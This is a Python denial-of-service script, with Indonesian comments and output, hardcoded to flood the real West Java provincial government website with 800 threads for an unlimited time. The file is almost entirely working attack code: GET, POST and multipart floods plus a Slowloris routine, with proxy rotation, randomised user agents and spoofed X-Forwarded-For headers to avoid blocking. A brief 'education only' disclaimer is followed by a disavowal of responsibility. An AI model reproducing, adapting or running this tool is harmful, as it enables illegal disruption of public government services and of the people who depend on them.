#!/usr/bin/env python3
"""
DDOS GANAS - JABARPROV EDITION
Multi-layer HTTP/HTTPS flood dengan proxy rotasi, user-agent random, dan bypass SSL.
Hanya untuk tujuan edukasi / pengujian resmi.
I just give the tools, whether they're used right or not is your business, boss.
"""

import requests
import threading
import random
import time
import socket
import ssl
import urllib3
from urllib.parse import urlparse
import sys
import os
import json
import hashlib

# ========== KONFIGURASI ==========
TARGET_URL = "https://jabarprov.go.id/"
THREADS = 800                 # Jumlah thread (makin tinggi makin kuat, tapi makan CPU)
DURATION = 0                  # 0 = infinite, atau detik (misal 60)
PROXY_FILE = "proxies.txt"    # File daftar proxy (opsional)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
]
REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://www.instagram.com/",
    "https://www.youtube.com/"
]

# ========== LOAD PROXY ==========
def load_proxies(file_path):
    proxies = []
    try:
        with open(file_path, "r") as f:
            for line in f:
                line = line.strip()
                if line:
                    # Format bisa ip:port atau http://ip:port
                    if not line.startswith("http"):
                        line = "http://" + line
                    proxies.append(line)
        return proxies
    except:
        return []

# ========== KELAS SERANGAN ==========
class Attack:
    def __init__(self, target, proxies=None):
        self.target = target
        self.proxies = proxies if proxies else []
        self.session = requests.Session()
        self.session.verify = False  # Matikan verifikasi SSL biar cepet
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def get_random_proxy(self):
        if self.proxies:
            proxy = random.choice(self.proxies)
            return {"http": proxy, "https": proxy}
        return None

    def get_random_headers(self):
        return {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Referer": random.choice(REFERERS),
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Requested-With": "XMLHttpRequest"
        }

    def http_flood(self):
        """Flood GET dengan parameter acak"""
        while True:
            try:
                url = self.target + f"?_{random.randint(1,999999)}"
                headers = self.get_random_headers()
                proxy = self.get_random_proxy()
                r = self.session.get(url, headers=headers, proxies=proxy, timeout=5)
                # print(f"[+] {r.status_code}")  # bisa di-uncomment buat debug
            except:
                pass

    def slowloris(self):
        """Slowloris versi HTTPS - jaga koneksi tetap hidup"""
        try:
            parsed = urlparse(self.target)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if parsed.scheme == "https":
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            sock.connect((host, port))
            # Kirim header awal
            sock.send(f"GET /?{random.randint(1,999)} HTTP/1.1\r\nHost: {host}\r\n".encode())
            sock.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
            sock.send(b"X-Header: " + os.urandom(32).hex().encode() + b"\r\n\r\n")
            # Kirim data kecil secara periodik
            while True:
                time.sleep(random.randint(10, 30))
                sock.send(b"X-KeepAlive: " + os.urandom(16).hex().encode() + b"\r\n")
        except:
            pass

    def post_flood(self):
        """Flood POST dengan data random"""
        while True:
            try:
                headers = self.get_random_headers()
                data = {"data": os.urandom(1024).hex(), "timestamp": time.time()}
                proxy = self.get_random_proxy()
                r = self.session.post(self.target, headers=headers, data=data, proxies=proxy, timeout=5)
            except:
                pass

    def multipart_flood(self):
        """Flood multipart/form-data (berat)"""
        while True:
            try:
                files = {'file': (f"{random.randint(1,999)}.txt", os.urandom(2048), 'text/plain')}
                headers = self.get_random_headers()
                proxy = self.get_random_proxy()
                r = self.session.post(self.target, files=files, headers=headers, proxies=proxy, timeout=5)
            except:
                pass

# ========== THREAD LAUNCHER ==========
def worker_loop(attack_obj, method):
    while True:
        try:
            if method == "http":
                attack_obj.http_flood()
            elif method == "slowloris":
                attack_obj.slowloris()
            elif method == "post":
                attack_obj.post_flood()
            elif method == "multipart":
                attack_obj.multipart_flood()
        except:
            pass

def launch_attack(target, threads, duration, proxies):
    attack = Attack(target, proxies)
    methods = ["http", "http", "http", "slowloris", "post", "multipart"]  # distribusi

    print(f"[*] Meluncurkan {threads} thread ke {target}")
    thread_list = []
    for i in range(threads):
        method = random.choice(methods)
        t = threading.Thread(target=worker_loop, args=(attack, method))
        t.daemon = True
        t.start()
        thread_list.append(t)

    if duration > 0:
        time.sleep(duration)
        print("[*] Waktu habis, menghentikan...")
        os._exit(0)
    else:
        # Infinite
        while True:
            time.sleep(1)

# ========== MAIN ==========
def main():
    print("""
    ╔═══════════════════════════════════════════════╗
    ║     DDOS GANAS - JABARPROV EDITION            ║
    ║     Target: """ + TARGET_URL + """          ║
    ║     Threads: """ + str(THREADS) + """                      ║
    ║     Durasi: """ + ("Tak Terbatas" if DURATION==0 else str(DURATION)+" detik") + """ ║
    ╚═══════════════════════════════════════════════╝
    """)
    proxies = load_proxies(PROXY_FILE)
    if proxies:
        print(f"[*] Memuat {len(proxies)} proxy.")
    else:
        print("[!] Tidak ada proxy. Serangan langsung dari IP sendiri (mudah diblokir).")
    print("[*] Memulai serangan... Tekan Ctrl+C untuk berhenti.")
    try:
        launch_attack(TARGET_URL, THREADS, DURATION, proxies)
    except KeyboardInterrupt:
        print("[!] Dihentikan oleh user.")
        sys.exit(0)

if __name__ == "__main__":
    main()
